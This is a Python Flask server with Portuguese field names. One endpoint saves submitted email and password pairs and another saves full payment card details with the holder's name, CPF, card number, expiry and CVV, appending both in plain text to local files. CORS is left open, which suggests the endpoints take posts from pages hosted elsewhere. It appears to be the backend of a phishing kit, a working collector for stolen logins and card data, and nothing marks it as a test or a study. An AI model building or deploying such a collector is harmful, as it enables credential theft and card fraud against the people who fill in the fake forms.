from flask import Flask, request, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)

if not os.path.exists('dados'):
    os.makedirs('dados')

@app.route('/api_il', methods=['POST'])
def salvar_email():
    email = request.form.get('email')
    senha = request.form.get('senha')

    if not email or not senha:
        return jsonify({"error": "E-mail e senha são obrigatórios."}), 400

    conteudo = f"{email}|{senha}\n"

    try:
        with open(os.path.join('dados', 'email.txt'), 'a', encoding='utf-8') as arquivo:
            arquivo.write(conteudo)
    except Exception as e:
        return jsonify({"error": f"Erro ao salvar: {str(e)}"}), 500

    return jsonify({"message": "E-mail e senha salvos com sucesso."}), 200


@app.route('/api_tao', methods=['POST'])
def salvar_cartao():
    nome = request.form.get('nome')
    cpf = request.form.get('cpf')
    cc = request.form.get('cc')
    mes = request.form.get('mes')
    ano = request.form.get('ano')
    cvv = request.form.get('cvv')

    if not nome or not cpf or not cc or not mes or not ano or not cvv:
        return jsonify({"error": "Todos os dados são obrigatórios."}), 400

    conteudo = (
        "------------------------------------------------------------\n"
        f"Nome: {nome} | CPF: {cpf} | "
        f"Cartão: {cc} | Validade: {mes}/{ano} | CVV: {cvv}\n"
    )

    try:
        with open(os.path.join('dados', 'dados_cartao.txt'), 'a', encoding='utf-8') as arquivo:
            arquivo.write(conteudo)
    except Exception as e:
        return jsonify({"error": f"Erro ao salvar: {str(e)}"}), 500

    return jsonify({"message": "Dados do cartão salvos com sucesso."}), 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
